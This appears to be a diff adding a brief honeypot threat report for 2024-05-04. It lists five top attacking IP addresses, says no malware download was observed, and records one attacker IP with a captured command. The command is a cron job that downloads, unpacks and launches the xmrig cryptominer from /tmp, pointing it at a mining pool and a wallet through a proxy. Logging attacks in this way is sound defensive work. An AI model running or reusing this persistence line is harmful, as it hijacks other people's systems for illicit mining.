@@ -1,0 +1,25 @@
+Top 5 IPs for 2024-05-04 :
+
+200.2.161.213
+178.128.173.216
+8.222.171.149
+111.53.104.249
+112.168.27.14
+
+
+
+Malware Download:
+
+None observed
+
+
+
+Commands/exploits observed:
+
+Attacker IP : 172.59.225.106
+
+set 1 
+
+*/1 * * * * if ! pgrep -x 'xmrig'; then cd /tmp && wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xvf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 && nohup ./xmrig -a rx -o stratum+ssl://rx.unminable.com:443 -u BTC:15jiJpXZxSiV2wTd8ebYxLVvvqLwg3Kjd7.unmineable_worker_redis -p x --proxy=174.64.199.79:4145 & fi
+
+
